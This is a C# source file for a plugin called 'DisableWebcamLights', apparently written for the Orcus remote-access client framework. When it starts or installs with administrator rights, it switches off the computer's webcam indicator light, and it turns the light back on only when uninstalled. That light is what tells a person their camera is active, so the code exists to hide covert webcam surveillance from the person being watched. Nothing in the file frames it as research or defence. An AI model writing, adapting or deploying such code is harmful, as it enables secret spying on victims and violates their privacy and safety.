using Orcus.Plugins;

namespace DisableWebcamLights
{
	public class Plugin : ClientController
	{
		private bool _webCamLightsDisabled;

		public override void Start()
		{
			if (!_webCamLightsDisabled && User.IsAdministrator)
			{
				_webCamLightsDisabled = true;
				WebcamLights.Disable();
			}
		}

		public override void Install(string executablePath)
		{
			if (!_webCamLightsDisabled && User.IsAdministrator)
			{
				_webCamLightsDisabled = true;
				WebcamLights.Disable();
			}
		}

		public override void Uninstall()
		{
			WebcamLights.Enable();
		}
	}
}
